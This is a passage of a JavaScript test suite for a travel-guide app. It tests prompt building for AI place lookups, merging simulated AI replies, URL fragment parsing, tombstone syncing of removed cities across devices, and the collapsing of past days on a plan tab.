  assert.ok(out.includes('- brasserie | Brasserie (the good one) | 4.8★ (5545) | plan'));
  // A place already eaten at stays in the roster: it is exactly the yardstick
  // a new recommendation has to beat.
  assert.ok(out.includes('- tanini | Tanini | 4.2★ | done'));
  // With no state at all the file's own names and statuses are used.
  const bare = C.promptKit.buildPlacePassPrompt(FAKE_RERUN, RIVALS, item, null);
  assert.ok(bare.includes('- brasserie | Brasserie 1900 | 4.8★ (5545) | plan'));
});

test('buildPlacePassPrompt is pure and fails loudly on a template with no landmark', () => {
  const item = RIVALS.items[0];
  const snap = JSON.stringify(RIVALS);
  C.promptKit.buildPlacePassPrompt(FAKE_RERUN, RIVALS, item, C.emptyState());
  assert.equal(JSON.stringify(RIVALS), snap);
  assert.throws(() => C.promptKit.buildPlacePassPrompt('# nothing here', RIVALS, item),
    /no RERUN:PLACE block/);
  assert.throws(() => C.promptKit.buildPlacePassPrompt(FAKE_RERUN, RIVALS, null),
    /No place to research/);
});

test('the real PROMPT.md builds a place pass that demands a ranking and a lookup', () => {
  const fs = require('fs');
  const path = require('path');
  const prompt = fs.readFileSync(path.join(__dirname, '..', 'PROMPT.md'), 'utf8');
  const built = C.newPlaceDelta(RIVALS, {
    name: 'Oda Garden', section: 'dinner', note: 'recommended by a couple at dinner'
  });
  const city = C.mergeDelta(RIVALS, built.delta).data;
  const item = city.items.filter((i) => i.id === built.id)[0];
  const out = C.promptKit.buildPlacePassPrompt(prompt, city, item, C.emptyState());
  // The contract the app's Apply path depends on.
  assert.ok(out.includes('"schema": 1'));
  assert.ok(out.includes('"delta": true'));
  assert.ok(out.includes('"ratings": {'));
  assert.ok(out.includes('"intel": {'));
  // The comparison, which is the whole point of this pass.
  assert.ok(out.includes('Lead with the placement, in plain words.'));
  assert.ok(out.includes('Ranks 2nd of your 7 dinner picks'));
  assert.ok(out.includes('Never guess, never carry a number forward from memory.'));
  assert.ok(out.includes('Match the right place.'));
  // A delta is never a whole guide, said in this block as in every other.
  assert.ok(out.includes('A delta is never a whole guide.'));
  // And the roster it has to rank against is really in there.
  assert.ok(out.includes('- brasserie | Brasserie 1900 | 4.8★ (5545) | plan'));
});

test('the whole add-then-ask round trip lands a rating and a ranking on the new card', () => {
  // Exactly the owner's dinner scenario, end to end, with the AI reply
  // simulated: add the place, build its prompt, paste back what the contract
  // asks for, and merge it through the one door the app uses.
  const fs = require('fs');
  const path = require('path');
  const prompt = fs.readFileSync(path.join(__dirname, '..', 'PROMPT.md'), 'utf8');
  const built = C.newPlaceDelta(RIVALS, {
    name: 'Oda Garden', section: 'dinner', status: 'plan',
    note: 'recommended by a couple at dinner'
  });
  const withPlace = C.mergeDelta(RIVALS, built.delta).data;
  const item = withPlace.items.filter((i) => i.id === built.id)[0];
  const promptText = C.promptKit.buildPlacePassPrompt(prompt, withPlace, item, C.emptyState());
  assert.ok(promptText.includes('oda-garden'));

  // What Claude sends back, in the shape RERUN:PLACE specifies.
  const reply = [
    'I looked it up.', '', '```json',
    JSON.stringify({
      schema: 1, delta: true,
      ratings: { 'oda-garden': { stars: 4.6, count: 812, source: 'Google Maps, Aug 2026', checked: '2026-08-26' } },
      intel: {
        'oda-garden': {
          verdicts: [{ tier: 'good', text: 'A fair swap for one dinner night, not a must.' }],
          tips: ['Ranks 2nd of your 4 dinner picks, behind Brasserie 1900.'],
          source: 'Google Maps reviews, Aug 2026'
        }
      }
    }, null, 2),
    '```'
  ].join('\n');

  const block = C.extractJsonBlock(reply);
  assert.ok(block, 'the reply must carry a parseable json fence');
  const res = C.mergeDelta(withPlace, JSON.parse(block));
  assert.deepEqual(res.errors, []);
  assert.equal(res.summary.added, 0);          // the place is already there
  assert.equal(res.summary.ratingsApplied, 1);
  assert.equal(res.summary.intelApplied, 1);
  const done = res.data.items.filter((i) => i.id === 'oda-garden')[0];
  assert.equal(done.rating.stars, 4.6);
  assert.equal(done.rating.count, 812);
  assert.equal(done.intel.tips[0], 'Ranks 2nd of your 4 dinner picks, behind Brasserie 1900.');
  assert.equal(done.intel.verdicts[0].tier, 'good');
  // Nothing the traveler had already researched was touched.
  const rival = res.data.items.filter((i) => i.id === 'brasserie')[0];
  assert.equal(rival.rating.stars, 4.8);
  assert.equal(rival.intel.verdicts[0].text, 'The duck is the reason to come.');
  assert.deepEqual(C.validate(res.data), []);
  // The card now carries research, so the engine stops offering to go get it.
  assert.ok(done.rating && typeof done.rating.stars === 'number');
});

test('a place pass reply that names the wrong id changes nothing, and says so', () => {
  const built = C.newPlaceDelta(RIVALS, { name: 'Oda Garden', section: 'dinner' });
  const city = C.mergeDelta(RIVALS, built.delta).data;
  const res = C.mergeDelta(city, {
    schema: 1, delta: true,
    ratings: { 'oda-gardens': { stars: 4.6 } },
    intel: { 'oda-gardens': { tips: ['Ranks 1st'] } }
  });
  assert.deepEqual(res.errors, []);
  assert.equal(res.summary.ratingsSkipped, 1);
  assert.equal(res.summary.intelSkipped, 1);
  assert.equal(res.data.items.filter((i) => i.id === 'oda-garden')[0].rating, undefined);
});

// ---------------------------------------------------------------------------
// The in-app transport, with a mocked fetch (no key, no network, no cost)
// ---------------------------------------------------------------------------
// callClaudeStream lives in the app shell rather than the engine, so it is
// pulled out of the assembled index.html by name and run against a fake
// streaming response. This is what proves the one-tap path parses a real
// Anthropic SSE stream into the fenced JSON the Apply path then merges,
// without spending anything to find out.
function loadCallClaudeStream(fetchImpl) {
  const fs = require('fs');
  const path = require('path');
  const html = fs.readFileSync(path.join(__dirname, '..', 'index.html'), 'utf8');
  const start = html.indexOf('function callClaudeStream(');
  assert.ok(start !== -1, 'callClaudeStream is missing from the assembled app');
  const end = html.indexOf('\n  }\n', start);
  assert.ok(end !== -1, 'could not find the end of callClaudeStream');
  const src = html.slice(start, end + 4);
  const fn = new Function('fetch', 'TextDecoder', 'CLAUDE_MODEL', 'CLAUDE_MAX_TOKENS',
    src + '\nreturn callClaudeStream;');
  return fn(fetchImpl, TextDecoder, 'claude-test', 1000);
}

// ---------------------------------------------------------------------------
// #plan= : one tap from a trip stop to a planned city (owner ask 2026-08-26)
// ---------------------------------------------------------------------------
// hashPlan lives in the app shell, so it is pulled out of the assembled
// index.html by name, the same way callClaudeStream is. What it needs from
// its surroundings is `location` and `trim`, both injected here.
function loadHashPlan(hash) {
  const fs = require('fs');
  const path = require('path');
  const html = fs.readFileSync(path.join(__dirname, '..', 'index.html'), 'utf8');
  const start = html.indexOf('function hashPlan(');
  assert.ok(start !== -1, 'hashPlan is missing from the assembled app');
  const end = html.indexOf('\n  }\n', start);
  assert.ok(end !== -1, 'could not find the end of hashPlan');
  const src = html.slice(start, end + 4);
  const fn = new Function('location', 'trim', src + '\nreturn hashPlan;');
  return fn({ hash: hash },
    (s) => String(s === null || s === undefined ? '' : s).replace(/^\s+|\s+$/g, ''))();
}

test('#plan= carries the trip stop the guide side needs to scaffold a city', () => {
  const p = loadHashPlan('#plan=ohrid&name=Ohrid&from=2026-09-05&to=2026-09-12&country=MK');
  assert.deepEqual(p, { name: 'Ohrid', from: '2026-09-05', to: '2026-09-12', country: 'MK' });
  // The trip page percent-encodes every value, so a two-word stop has to survive.
  assert.equal(loadHashPlan('#plan=novi-sad&name=Novi%20Sad&from=2026-10-01&to=2026-10-08').name,
    'Novi Sad');
  // country is optional; the rest is not.
  assert.equal(loadHashPlan('#plan=x&name=X&from=2026-10-01&to=2026-10-08').country, '');
});

test('#plan= is ignored unless it is actually actionable', () => {
  assert.equal(loadHashPlan(''), null);
  assert.equal(loadHashPlan('#city=ohrid-2026-09-05'), null);   // the OTHER fragment
  assert.equal(loadHashPlan('#profile'), null);
  assert.equal(loadHashPlan('#plan=ohrid'), null);              // no name, no dates
  assert.equal(loadHashPlan('#plan=ohrid&name=Ohrid'), null);   // no dates
  assert.equal(loadHashPlan('#plan=ohrid&name=%20%20&from=2026-09-05&to=2026-09-12'), null);
  assert.equal(loadHashPlan('#plan=ohrid&name=Ohrid&from=soon&to=2026-09-12'), null);
  // Backwards dates are the one case that would throw inside blankCity, so it
  // is refused here rather than left to blow up mid-boot.
  assert.equal(loadHashPlan('#plan=ohrid&name=Ohrid&from=2026-09-12&to=2026-09-05'), null);
});

test('a #plan= fragment scaffolds the exact id a second arrival then finds', () => {
  // The guard in consumePlanHash is `store.cities[cityId(blankCity(...))]`, so
  // what has to hold is that the fragment maps to ONE id, deterministically:
  // tapping the same stop card twice must navigate, never scaffold a second
  // copy under a keep-both name and never re-run generation over a real guide.
  const p = loadHashPlan('#plan=ohrid&name=Ohrid&from=2026-09-05&to=2026-09-12&country=MK');
  const scaffold = C.appStore.blankCity(p.name, p.country, p.from, p.to);
  assert.deepEqual(C.validate(scaffold), []);          // valid through the same door as paste
  const id = C.cityId(scaffold);
  assert.equal(id, 'ohrid-2026-09-05');
  // Deterministic: the second arrival derives the same id from the same link.
  assert.equal(C.cityId(C.appStore.blankCity(p.name, p.country, p.from, p.to)), id);
  // And that id is exactly what the trip page's "City guide" link would use
  // once a guide exists, so the two doors cannot point at different cities.
  assert.equal(C.slug('Ohrid') + '-' + p.from, id);
  // Added to a store, the guard sees it.
  const added = C.appStore.add(C.appStore.normalize({}), scaffold);
  assert.equal(added.cityId, id);
  assert.ok(Object.prototype.hasOwnProperty.call(added.store.cities, id));
  // The scaffold is empty by construction: one placeholder item, no research.
  // That is what makes replacing it wholesale (the Update-data door) safe.
  assert.equal(scaffold.items.length, 1);
  assert.equal(scaffold.city.country, 'MK');
});

function sseBody(events) {
  // Chunked at awkward boundaries on purpose: the real stream splits wherever
  // the network feels like it, and the parser has to survive an event cut in
  // half. Every chunk here is 7 bytes.
  const text = events.map((e) => 'event: ' + e.type + '\ndata: ' + JSON.stringify(e) + '\n\n').join('');
  const bytes = new TextEncoder().encode(text);
  let at = 0;
  return {
    getReader: () => ({
      read: () => {
        if (at >= bytes.length) return Promise.resolve({ done: true });
        const slice = bytes.slice(at, at + 7);
        at += 7;
        return Promise.resolve({ done: false, value: slice });
      }
    })
  };
}


// ==========================================================================
// Removal tombstones: a removed city stays removed, on every device.
// ==========================================================================
// The bug (owner report 2026-08-27): "I'm repeatedly removing a city (Tirana)
// but it keeps adding back when I refresh." Removal was local-only, so the
// account's rows survived and the next pull put the city straight back.

const T_OLD = '2026-08-27T09:00:00.000Z';
const T_MID = '2026-08-27T10:00:00.000Z';
const T_NEW = '2026-08-27T11:00:00.000Z';
const TK = () => C.syncKit.tombKit;

test('a tombstone map keeps only entries with a readable stamp', () => {
  const m = TK().normalize({
    'tirana-2026-08-22': T_MID,
    'nostamp-2026-01-01': null,
    'bad-2026-01-01': 'not a date',
    '': T_MID,
    'numeric-2026-01-01': 1756288800000
  });
  assert.deepEqual(Object.keys(m), ['tirana-2026-08-22']);
  // A tombstone with no usable stamp cannot be compared against a row, and
  // treating it as "removed at the beginning of time" would delete a live
  // city. It is dropped instead.
  assert.equal(TK().at(m, 'nostamp-2026-01-01'), null);
  assert.equal(TK().at(m, 'tirana-2026-08-22'), T_MID);
});

test('a city named constructor is an ordinary key, not a booby trap', () => {
  // Every plain object already answers to these. A map built with {} and read
  // with a bare property access would report "constructor" as tombstoned in
  // EVERY account, and would delete a city nobody removed.
  const m = TK().normalize({ constructor: T_MID, toString: T_NEW });
  assert.equal(TK().at(m, 'constructor'), T_MID);
  assert.equal(TK().at(m, 'toString'), T_NEW);
  assert.equal(TK().at(m, 'hasOwnProperty'), null);
  assert.equal(TK().at(TK().normalize({}), 'constructor'), null);
  assert.equal(TK().at(TK().normalize({}), 'valueOf'), null);
  // And it survives the merge and the plan the same way.
  const merged = TK().merge({ constructor: T_OLD }, { constructor: T_NEW });
  assert.equal(TK().at(merged, 'constructor'), T_NEW);
  const plan = TK().plan({ constructor: T_NEW }, {}, { constructor: T_OLD });
  assert.deepEqual(plan.dropRemote, ['constructor']);
  assert.deepEqual(plan.clearTombs, []);
});

test('two devices removing two different cities keep BOTH removals', () => {
  // The reason tombstones do not reconcile as a whole block. Newest-wins over
  // the map would throw one of these away and resurrect that city.
  const mine = { 'tirana-2026-08-22': T_MID };
  const theirs = { 'batumi-2026-08-08': T_NEW };
  const u = TK().merge(mine, theirs);
  assert.deepEqual(Object.keys(u).sort(), ['batumi-2026-08-08', 'tirana-2026-08-22']);
  assert.equal(TK().at(u, 'tirana-2026-08-22'), T_MID);
  assert.equal(TK().at(u, 'batumi-2026-08-08'), T_NEW);
  // Per ENTRY, newest wins.
  const both = TK().merge({ x: T_OLD }, { x: T_NEW });
  assert.equal(TK().at(both, 'x'), T_NEW);
  assert.equal(TK().at(TK().merge({ x: T_NEW }, { x: T_OLD }), 'x'), T_NEW);
});

test('differ says exactly whether a merge added anything', () => {
  assert.equal(TK().differ({ a: T_MID }, { a: T_MID }), false);
  assert.equal(TK().differ({ a: T_MID }, { a: T_NEW }), true);
  assert.equal(TK().differ({ a: T_MID }, { a: T_MID, b: T_MID }), true);
  assert.equal(TK().differ({ a: T_MID, b: T_MID }, { a: T_MID }), true);
  assert.equal(TK().differ(null, null), false);
  assert.equal(TK().differ(null, { a: T_MID }), true);
});

test('remove then pull does not resurrect: the row is deleted, not adopted', () => {
  // Rob removes Tirana at 10:00. The account still holds the row he pushed at
  // 09:00. The pull must NOT bring it back, and must delete it so no other
  // device can either.
  const plan = TK().plan(
    { 'tirana-2026-08-22': T_MID },
    {},                                    // this device no longer holds it
    { 'tirana-2026-08-22': T_OLD }         // the account still does
  );
  assert.deepEqual(plan.dropRemote, ['tirana-2026-08-22']);
  assert.deepEqual(plan.dropLocal, []);
  assert.deepEqual(plan.clearTombs, []);
  assert.equal(plan.skipPush['tirana-2026-08-22'], 1);
});

test('the second device deletes its copy locally instead of pushing it back', () => {
  // The laptop still holds Tirana, stamped before the removal Rob made on the
  // phone. This is the loop he was watching: without this the laptop's next
  // pull sees a city the server does not have and pushes it straight back up.
  const plan = TK().plan(
    { 'tirana-2026-08-22': T_MID },
    { 'tirana-2026-08-22': T_OLD },        // the laptop's stale copy
    {}                                      // the row is already gone
  );
  assert.deepEqual(plan.dropLocal, ['tirana-2026-08-22']);
  assert.deepEqual(plan.dropRemote, []);
  assert.equal(plan.skipPush['tirana-2026-08-22'], 1);
  // And with the row still there, BOTH copies go.
  const both = TK().plan(
    { 'tirana-2026-08-22': T_MID },
    { 'tirana-2026-08-22': T_OLD },
    { 'tirana-2026-08-22': T_OLD }
  );
  assert.deepEqual(both.dropLocal, ['tirana-2026-08-22']);
  assert.deepEqual(both.dropRemote, ['tirana-2026-08-22']);
});

test('re-adding the same city later clears the tombstone rather than deleting it', () => {
  // Rob changes his mind and adds Tirana back with the same id. The copy is
  // now stamped AFTER the removal, so the removal is no longer the newest
  // thing said about that city.
  const fromRemote = TK().plan(
    { 'tirana-2026-08-22': T_MID },
    {},
    { 'tirana-2026-08-22': T_NEW }         // re-added on another device
  );
  assert.deepEqual(fromRemote.clearTombs, ['tirana-2026-08-22']);
  assert.deepEqual(fromRemote.dropRemote, []);
  assert.deepEqual(fromRemote.dropLocal, []);
  assert.equal(fromRemote.skipPush['tirana-2026-08-22'], undefined);

  const fromLocal = TK().plan(
    { 'tirana-2026-08-22': T_MID },
    { 'tirana-2026-08-22': T_NEW },        // re-added here
    {}
  );
  assert.deepEqual(fromLocal.clearTombs, ['tirana-2026-08-22']);
  assert.deepEqual(fromLocal.dropLocal, []);
});

test('a tie goes to the removal, never to the resurrection', () => {
  // A device that pushed a city and removed it inside the same millisecond
  // would otherwise resurrect it on every single pull, forever.
  const plan = TK().plan(
    { 'tirana-2026-08-22': T_MID },
    {},
    { 'tirana-2026-08-22': T_MID }
  );
  assert.deepEqual(plan.dropRemote, ['tirana-2026-08-22']);
  assert.deepEqual(plan.clearTombs, []);
});

test('cities nobody removed are untouched by the tombstone plan', () => {
  const plan = TK().plan(
    { 'tirana-2026-08-22': T_MID },
    { 'ksamil-2026-08-29': T_OLD },
    { 'ksamil-2026-08-29': T_OLD, 'batumi-2026-08-08': T_NEW }
  );
  assert.deepEqual(plan.dropRemote, []);
  assert.deepEqual(plan.dropLocal, []);
  assert.deepEqual(plan.clearTombs, []);
  assert.deepEqual(Object.keys(plan.skipPush), ['tirana-2026-08-22']);
  // An empty tombstone map decides nothing at all, which is the state every
  // account is in until the first removal.
  const none = TK().plan({}, { a: T_OLD }, { b: T_NEW });
  assert.deepEqual(none.dropRemote, []);
  assert.deepEqual(none.dropLocal, []);
  assert.deepEqual(none.clearTombs, []);
  assert.deepEqual(Object.keys(none.skipPush), []);
});

test('tombstones ride the profile row and never blank the rest of it', () => {
  const row = C.syncKit.buildProfileRow({ updated: P_LOCAL, interests: ['ruins'] },
    { removed: { value: { 'tirana-2026-08-22': T_MID }, updated: T_MID } });
  assert.deepEqual(row.data.removed.value, { 'tirana-2026-08-22': T_MID });
  // The ROW's stamp stays the profile's: a removal must not make an otherwise
  // stale profile win a reconcile, same rule the key and genmeta sidecars follow.
  assert.equal(row.updated_at, P_LOCAL);
  assert.deepEqual(row.data.interests, ['ruins']);
  // An empty map is no opinion at all, not an assertion that nothing was
  // removed: writing one would delete the account's real tombstones.
  const empty = C.syncKit.buildProfileRow({ updated: P_LOCAL },
    { removed: { value: {}, updated: T_MID } });
  assert.equal(empty.data.removed, undefined);
  // And the sidecars never leak into the profile itself.
  assert.equal(C.profile.normalize(row.data).removed, undefined);
});

test('the trip surface merges tombstones into the row instead of replacing them', () => {
  // mergeProfileRow is the credentials-only push path. A whole-row upsert
  // built from this device's map alone would delete the account's other
  // removals, which is the same class of bug as blanking the Claude key.
  const account = {
    data: {
      interests: ['ruins'],
      removed: { value: { 'batumi-2026-08-08': T_NEW }, updated: T_NEW }
    },
    updated_at: P_REMOTE
  };
  const row = C.syncKit.mergeProfileRow(account, {
    removed: { value: { 'tirana-2026-08-22': T_MID }, updated: T_MID }
  });
  assert.deepEqual(Object.keys(row.data.removed.value).sort(),
    ['batumi-2026-08-08', 'tirana-2026-08-22']);
  assert.deepEqual(row.data.interests, ['ruins']);
  assert.equal(row.updated_at, P_REMOTE);   // the account keeps its profile stamp
});

test('a row that carries ONLY tombstones is still worth pushing', () => {
  // The bug the mocked remove-then-pull walkthrough caught on 2026-08-27: the
  // shell refuses to push a profile row with "nothing to say", and a traveler
  // who has never filled in a profile and never saved a Claude key has exactly
  // that row plus one tombstone. Dropping it there meant the removal never
  // reached the account and the other device pushed the city straight back.
  const row = C.syncKit.buildProfileRow({}, {
    removed: { value: { 'tirana-2026-08-22': T_MID }, updated: T_MID }
  });
  assert.equal(row.data.updated, undefined, 'no profile has ever been saved');
  assert.equal(row.data.apiKey, undefined);
  assert.equal(row.data.genmeta, undefined);
  // ...and yet the row carries the one thing that has to go up.
  assert.ok(row.data.removed, 'the tombstone survives into the payload');
  assert.deepEqual(row.data.removed.value, { 'tirana-2026-08-22': T_MID });
  // A row with genuinely nothing to say carries no sidecar at all, which is
  // what the shell's "is this worth pushing" guard actually reads.
  const empty = C.syncKit.buildProfileRow({}, {});
  assert.equal(empty.data.removed, undefined);
  assert.equal(empty.data.updated, undefined);
  assert.equal(empty.data.apiKey, undefined);
});

test('a push is worth making exactly when this device knows a removal the account does not', () => {
  const account = { data: { removed: { value: { a: T_MID }, updated: T_MID } }, updated_at: P_REMOTE };
  // Nothing new to say.
  assert.equal(C.syncKit.sidecarsWorthPushing(account, { removed: { value: { a: T_MID }, updated: T_MID } }), false);
  // A removal the account has never heard of.
  assert.equal(C.syncKit.sidecarsWorthPushing(account, { removed: { value: { a: T_MID, b: T_NEW }, updated: T_NEW } }), true);
  // A newer stamp on a removal it already knows.
  assert.equal(C.syncKit.sidecarsWorthPushing(account, { removed: { value: { a: T_NEW }, updated: T_NEW } }), true);
  // An account that holds a removal this device does not is a PULL, not a push.
  assert.equal(C.syncKit.sidecarsWorthPushing(account, {}), false);
});

// ==========================================================================
// The trip surface's door back to the guides (items 6a and 7)
// ==========================================================================

const IDX = (ids, archived) => ({
  ids: ids,
  archived: (archived || []).reduce((m, id) => { m[id] = true; return m; }, Object.create(null))
});
// Rob's real shape on 2026-08-27: in Tirana until the 29th, Ksamil next.
const STOPS = [
  { name: 'Batumi', checkIn: '2026-08-08', checkOut: '2026-08-15' },
  { name: 'Tirana', checkIn: '2026-08-22', checkOut: '2026-08-29' },
  { name: 'Ksamil', checkIn: '2026-08-29', checkOut: '2026-09-05' }
];
const TODAY = '2026-08-27';

test('the door opens the guide for the stop you are standing in', () => {
  const d = C.guideDoorKit.resolve(STOPS,
    IDX(['tirana-2026-08-22', 'ksamil-2026-08-29']), TODAY);
  assert.equal(d.kind, 'guide');
  assert.equal(d.when, 'NOW');
  assert.equal(d.stop.name, 'Tirana');
  assert.equal(d.guideId, 'tirana-2026-08-22');
});

test('a REMOVED guide is skipped and the door offers the next stop instead', () => {
  // Exactly Rob's data after removing Tirana: he is still IN Tirana, but its
  // guide is gone, so the useful door is Ksamil.
  const d = C.guideDoorKit.resolve(STOPS, IDX(['ksamil-2026-08-29']), TODAY);
  assert.equal(d.kind, 'guide');
  assert.equal(d.when, 'NEXT');
  assert.equal(d.stop.name, 'Ksamil');
  assert.equal(d.guideId, 'ksamil-2026-08-29');
});

test('an ARCHIVED guide is skipped exactly like a removed one', () => {
  // Owner report: "my 'now' city is showing an archived city". A city he has
  // left is never the answer to "where am I going next".
  const d = C.guideDoorKit.resolve(STOPS,
    IDX(['tirana-2026-08-22', 'ksamil-2026-08-29'], ['tirana-2026-08-22']), TODAY);
  assert.equal(d.when, 'NEXT');
  assert.equal(d.stop.name, 'Ksamil');
  assert.equal(d.guideId, 'ksamil-2026-08-29');
});

test('with no live guide anywhere ahead, the door still names a stop', () => {
  // Never a dead end: it opens the guide half so a guide can be written,
  // which is the same door a stop card offers.
  const d = C.guideDoorKit.resolve(STOPS, IDX([]), TODAY);
  assert.equal(d.kind, 'plan');
  assert.equal(d.when, 'NOW');
  assert.equal(d.stop.name, 'Tirana');
  assert.equal(d.guideId, '');
  // Archived-only is the same as none, for this question.
  const arch = C.guideDoorKit.resolve(STOPS,
    IDX(['tirana-2026-08-22'], ['tirana-2026-08-22']), TODAY);
  assert.equal(arch.kind, 'plan');
});

test('nothing dated at all falls back to the app root, and says so', () => {
  assert.deepEqual(C.guideDoorKit.resolve([], IDX(['x-2026-01-01']), TODAY),
    { when: null, stop: null, guideId: '', kind: 'root' });
  // Every stop behind us is the same case: there is no NOW and no NEXT.
  const past = [{ name: 'Batumi', checkIn: '2026-08-08', checkOut: '2026-08-15' }];
  assert.equal(C.guideDoorKit.resolve(past, IDX(['batumi-2026-08-08']), TODAY).kind, 'root');
  // Junk in the stop list is skipped rather than thrown on.
  assert.equal(C.guideDoorKit.resolve([null, {}, { name: '   ' }], IDX([]), TODAY).kind, 'root');
});

test('a shifted check-in still finds the guide it belongs to', () => {
  // Rob moves an arrival by a day far more often than he visits a city twice,
  // so a guide filed under the old date is still the right guide. Nearest wins.
  const stops = [{ name: 'Ohrid', checkIn: '2026-09-04', checkOut: '2026-09-10' }];
  const d = C.guideDoorKit.resolve(stops,
    IDX(['ohrid-2026-08-01', 'ohrid-2026-09-03']), '2026-09-01');
  assert.equal(d.guideId, 'ohrid-2026-09-03');
  // And an archived near guide loses to a live far one rather than winning on
  // distance: an archived guide is not a destination at all.
  const d2 = C.guideDoorKit.resolve(stops,
    IDX(['ohrid-2026-08-01', 'ohrid-2026-09-03'], ['ohrid-2026-09-03']), '2026-09-01');
  assert.equal(d2.guideId, 'ohrid-2026-08-01');
});

test('the resolver walks upcoming stops in date order, whatever order they arrive in', () => {
  const shuffled = [STOPS[2], STOPS[0], STOPS[1]];
  const d = C.guideDoorKit.resolve(shuffled, IDX(['ksamil-2026-08-29']), TODAY);
  assert.equal(d.stop.name, 'Ksamil');
  // Two upcoming stops, only the later one has a guide: it is still found.
  const stops = [
    { name: 'Ksamil', checkIn: '2026-08-29', checkOut: '2026-09-05' },
    { name: 'Ohrid', checkIn: '2026-09-05', checkOut: '2026-09-12' }
  ];
  const d2 = C.guideDoorKit.resolve(stops, IDX(['ohrid-2026-09-05']), TODAY);
  assert.equal(d2.stop.name, 'Ohrid');
  assert.equal(d2.when, 'NEXT');
});

test('liveIdForStop and idFor agree with the guide side on what an id is', () => {
  assert.equal(C.guideDoorKit.idFor('Tirana', '2026-08-22'), 'tirana-2026-08-22');
  assert.equal(C.guideDoorKit.idFor('  Ksamil ', '2026-08-29'), 'ksamil-2026-08-29');
  assert.equal(C.guideDoorKit.idFor('', '2026-08-22'), '');
  assert.equal(C.guideDoorKit.idFor('Tirana', ''), '');
  // The id the guide half actually derives, for the same city.
  const city = C.appStore.blankCity('Tirana', 'AL', '2026-08-22', '2026-08-29');
  assert.equal(C.cityId(city), C.guideDoorKit.idFor('Tirana', '2026-08-22'));
  assert.equal(C.guideDoorKit.liveIdForStop({ name: 'Nowhere' }, IDX(['x-2026-01-01'])), '');
});

// ==========================================================================
// Plan tab: a finished past day folds itself away (item 2)
// ==========================================================================

test('a past day whose items are all settled collapses by default', () => {
  const done = [{ status: 'done' }, { status: 'done' }];
  assert.equal(C.planDayAutoCollapsed('2026-08-25', done, '2026-08-27'), true);
  // Archived counts as settled too (day groups drop archived items today, so
  // this arm is future-proofing rather than a live path).
  assert.equal(C.planDayAutoCollapsed('2026-08-25',
    [{ status: 'done' }, { status: 'archived' }], '2026-08-27'), true);
});

test('a past day with anything still open stays expanded', () => {
  assert.equal(C.planDayAutoCollapsed('2026-08-25',
    [{ status: 'done' }, { status: 'plan' }], '2026-08-27'), false);
  assert.equal(C.planDayAutoCollapsed('2026-08-25', [{ status: 'plan' }], '2026-08-27'), false);
});

test('today and every day ahead never auto-collapse, however finished', () => {
  const done = [{ status: 'done' }];
  assert.equal(C.planDayAutoCollapsed('2026-08-27', done, '2026-08-27'), false);
  assert.equal(C.planDayAutoCollapsed('2026-08-28', done, '2026-08-27'), false);
  // An EMPTY past day has nothing to congratulate you for, and "0 done" is a
  // worse header than the empty group it would replace.
  assert.equal(C.planDayAutoCollapsed('2026-08-25', [], '2026-08-27'), false);
  assert.equal(C.planDayAutoCollapsed('2026-08-25', null, '2026-08-27'), false);
  assert.equal(C.planDayAutoCollapsed(null, done, '2026-08-27'), false);
});

test('planDayDoneCount counts what the folded header claims', () => {
  assert.equal(C.planDayDoneCount([{ status: 'done' }, { status: 'archived' }, { status: 'plan' }]), 2);
  assert.equal(C.planDayDoneCount([]), 0);
  assert.equal(C.planDayDoneCount(null), 0);
});

test('the traveler\'s own choice beats the computed default, both ways', () => {
  const st = C.emptyState();
  // Auto-collapsed, opened by hand: the override sticks, and it is a REAL
  // stored false (not an absence), or the next render folds it again.
  assert.equal(C.isPlanDayCollapsed(st, '2026-08-25', true), true);
  C.togglePlanDay(st, '2026-08-25', true);
  assert.equal(st.collapsedPlanDays['2026-08-25'], false);
  assert.equal(C.isPlanDayCollapsed(st, '2026-08-25', true), false);
  // Collapsing it again hands the day back to the auto rule rather than
  // pinning it: finishing one more item on an older day still folds it.
  C.togglePlanDay(st, '2026-08-25', true);
  assert.equal(Object.prototype.hasOwnProperty.call(st.collapsedPlanDays, '2026-08-25'), false);
  assert.equal(C.isPlanDayCollapsed(st, '2026-08-25', true), true);
  // A day with no auto default behaves exactly as it did before any of this.
  C.togglePlanDay(st, '2026-08-28');
  assert.equal(st.collapsedPlanDays['2026-08-28'], true);
  C.togglePlanDay(st, '2026-08-28');
  assert.equal(Object.prototype.hasOwnProperty.call(st.collapsedPlanDays, '2026-08-28'), false);
});

test('expandPlanDay always ends up expanded, whatever the default was', () => {
  const st = C.emptyState();
  C.expandPlanDay(st, '2026-08-25', true);
  assert.equal(C.isPlanDayCollapsed(st, '2026-08-25', true), false);
  // On a day with no auto default it clears the override rather than storing
  // a redundant false.
  st.collapsedPlanDays['2026-08-28'] = true;
  C.expandPlanDay(st, '2026-08-28', false);
  assert.equal(Object.prototype.hasOwnProperty.call(st.collapsedPlanDays, '2026-08-28'), false);
});

test('Expand all beats the auto rule, and Collapse all hands it back', () => {
  const st = C.emptyState();
  const isos = ['2026-08-25', '2026-08-28'];
  const autos = { '2026-08-25': true, '2026-08-28': false };
  C.setPlanDaysCollapsed(st, isos, false, autos);
  assert.equal(st.collapsedPlanDays['2026-08-25'], false);   // a real departure
  assert.equal(Object.prototype.hasOwnProperty.call(st.collapsedPlanDays, '2026-08-28'), false);
  assert.equal(C.isPlanDayCollapsed(st, '2026-08-25', true), false);
  C.setPlanDaysCollapsed(st, isos, true, autos);
  assert.equal(Object.prototype.hasOwnProperty.call(st.collapsedPlanDays, '2026-08-25'), false);
  assert.equal(st.collapsedPlanDays['2026-08-28'], true);
  // With no autos passed it is exactly the old function.
  const st2 = C.emptyState();
  C.setPlanDaysCollapsed(st2, isos, true);
  assert.deepEqual(st2.collapsedPlanDays, { '2026-08-25': true, '2026-08-28': true });
  C.setPlanDaysCollapsed(st2, isos, false);
  assert.deepEqual(st2.collapsedPlanDays, {});
});

test('planModel hands the renderer the auto flag and the done count per day', () => {
  const data = clone(GOOD);
  const st = C.emptyState();
  // 2026-08-10 holds Tanini; mark it done so that whole day is settled.
  C.setStatus(st, 'tanini', 'done');
  const pm = C.planModel(data, st, '2026-08-14');
  const d10 = pm.days.filter(d => d.iso === '2026-08-10')[0];
  assert.ok(d10, 'the stay includes 2026-08-10');
  assert.equal(d10.past, true);
  assert.equal(d10.auto, true);
  assert.equal(d10.done, 1);
  // 2026-08-13 holds Brasserie, still in the plan: past, but not settled.
  const d13 = pm.days.filter(d => d.iso === '2026-08-13')[0];
  assert.equal(d13.past, true);
  assert.equal(d13.auto, false);
  assert.equal(d13.done, 0);
  // A day ahead of "today" is never auto, and neither is an empty past day.
  const ahead = pm.days.filter(d => d.iso === '2026-08-15')[0];
